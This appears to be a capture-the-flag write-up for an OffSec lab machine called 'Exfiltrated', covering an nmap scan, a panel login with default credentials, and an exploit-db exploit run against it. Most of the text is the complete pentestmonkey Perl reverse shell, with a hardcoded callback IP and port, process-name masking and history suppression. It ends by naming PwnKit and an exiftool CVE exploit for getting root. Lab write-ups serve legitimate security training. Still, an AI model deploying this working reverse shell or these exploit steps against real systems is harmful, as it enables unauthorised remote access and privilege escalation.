```
nmap -sC -sV -p- 192.168.160.163                                     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-26 15:01 CDT
Nmap scan report for 192.168.160.163
Host is up (0.047s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1994b952225ed0f8520d363b448bbcf (RSA)
|   256 0f448badad95b8226af036ac19d00ef3 (ECDSA)
|_  256 32e12a6ccc7ce63e23f4808d33ce9b3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.77 seconds

```

Visiting the site reveals we need to add exfiltrated.offsec to hosts.

Robots.txt mentioned panel. Visiting that with admin:admin as credentials, this worked. Looked into an exploit and found the below.

https://www.exploit-db.com/exploits/49876

```
python 49876.py -l admin -p admin -u http://exfiltrated.offsec/panel/
```

I created this reverse shell after not finding python and only found perl.

```reverse.pl
#!/usr/bin/perl -w
# perl-reverse-shell - A Reverse Shell implementation in PERL
# Copyright (C) 2006 pentestmonkey@pentestmonkey.net
#
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  The author accepts no liability
# for damage caused by this tool.  If these terms are not acceptable to you, then
# do not use this tool.
#
# In all other respects the GPL version 2 applies:
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2 as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  If these terms are not acceptable to
# you, then do not use this tool.
#
# You are encouraged to send comments, improvements or suggestions to
# me at pentestmonkey@pentestmonkey.net
#
# Description
# -----------
# This script will make an outbound TCP connection to a hardcoded IP and port.
# The recipient will be given a shell running as the current user (apache normally).
#

use strict;
use Socket;
use FileHandle;
use POSIX;
my $VERSION = "1.0";

# Where to send the reverse shell.  Change these.
my $ip = '192.168.45.216';
my $port = 4444;

# Options
my $daemon = 1;
my $auth   = 0; # 0 means authentication is disabled and any 
		# source IP can access the reverse shell
my $authorised_client_pattern = qr(^127\.0\.0\.1$);

# Declarations
my $global_page = "";
my $fake_process_name = "/usr/sbin/apache";

# Change the process name to be less conspicious
$0 = "[httpd]";

# Authenticate based on source IP address if required
if (defined($ENV{'REMOTE_ADDR'})) {
	cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");

	if ($auth) {
		unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
			cgiprint("ERROR: Your client isn't authorised to view this page");
			cgiexit();
		}
	}
} elsif ($auth) {
	cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access");
	cgiexit(0);
}

# Background and dissociate from parent process if required
if ($daemon) {
	my $pid = fork();
	if ($pid) {
		cgiexit(0); # parent exits
	}

	setsid();
	chdir('/');
	umask(0);
}

# Make TCP connection for reverse shell
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
	cgiprint("Sent reverse shell to $ip:$port");
	cgiprintpage();
} else {
	cgiprint("Couldn't open reverse shell to $ip:$port: $!");
	cgiexit();	
}

# Redirect STDIN, STDOUT and STDERR to the TCP connection
open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");
$ENV{'HISTFILE'} = '/dev/null';
system("w;uname -a;id;pwd");
exec({"/bin/bash"} ($fake_process_name, "-i"));

# Wrapper around print
sub cgiprint {
	my $line = shift;
	$line .= "<p>\n";
	$global_page .= $line;
}

# Wrapper around exit
sub cgiexit {
	cgiprintpage();
	exit 0; # 0 to ensure we don't give a 500 response.
}

# Form HTTP response using all the messages gathered by cgiprint so far
sub cgiprintpage {
	print "Content-Length: " . length($global_page) . "\r
Connection: close\r
Content-Type: text\/html\r\n\r\n" . $global_page;
}

```

Ran the reverse shell and got a call back. After checking over linpeas, I had a few options. I utilized PwnKit as this was the easiest route. 

Another solution is to utilize an exiftool exploit. This works because there is a cron job that runs and runs the command against anything placed in the uploads folder. I found that the version was exploitable using the following:

https://github.com/convisolabs/CVE-2021-22204-exiftool

This allows you to create a reverse shell in a file. It would then be a reverse shell as root.